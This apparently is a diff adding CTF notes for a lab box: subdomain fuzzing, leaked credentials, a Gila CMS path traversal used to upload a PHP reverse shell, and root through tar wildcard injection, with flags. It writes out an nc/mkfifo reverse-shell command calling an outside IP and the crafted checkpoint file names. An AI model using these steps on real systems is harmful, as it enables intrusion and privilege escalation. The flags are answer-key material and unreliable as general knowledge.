@@ -1,0 +1,72 @@
+CMS Used: gila
+
+domain name: cmess.thm
+-nothing found in cmess.thm, now performing subdomain fuzzing
+
+fuzz subdomain
+==============
+wfuzz -c -w ~/script/dictionary/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "HOST: FUZZ.cmess.thm" --hl 107 cmess.thm
+
+found credential in http://dev.cmess.thm/
+=========================================
+andre@cmess.thm:KPFTN_f2yxe% 
+
+login to gila cms admin panel
+=============================
+http://cmess.thm/admin/fm?f=../ access local file, upload reverse shell
+
+reverse shell location http://cmess.thm/assets/revShell.php
+
+found credential in config.php
+==============================
+'host' => 'localhost',
+    'user' => 'root',
+    'pass' => 'r0otus3rpassw0rd',
+
+found possible credential in /opt
+=================================
+www-data@cmess:/opt$ cat .password.bak
+cat .password.bak
+andres backup password
+UQfsdCB7aAP6
+
+//credential for andre(su): andre:UQfsdCB7aAP6
+
+user flag
+=========
+andre@cmess:~$ cat user.txt
+cat user.txt
+thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
+
+found a note in /home/andre/backup/
+===================================
+andre@cmess:/tmp$ cat note
+cat note
+Note to self.
+Anything in here will be backed up! 
+
+//the backup are stored in /tmp/andre_backup.tar.gz
+//backup runs every 2 min, still finding the script that backup
+//cat /etc/crontab found that 
+*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
+-backup every 2 minute(cronjob)
+
+-find tar wildcard injection for privEsc
+-link: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+
+/*
+-in /home/andre/backup 
+
+echo "mkfifo /tmp/lhennp; nc 10.9.23.162 17721 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+
+–checkpoint[=NUMBER] show progress messages every Numbers record (default 10)
+–checkpoint-action=ACTION execute ACTION on each checkpoint
+*/
+
+root flag
+=========
+cat root.txt
+thm{9f85b7fdeb2cf96985bf5761a93546a2}
+
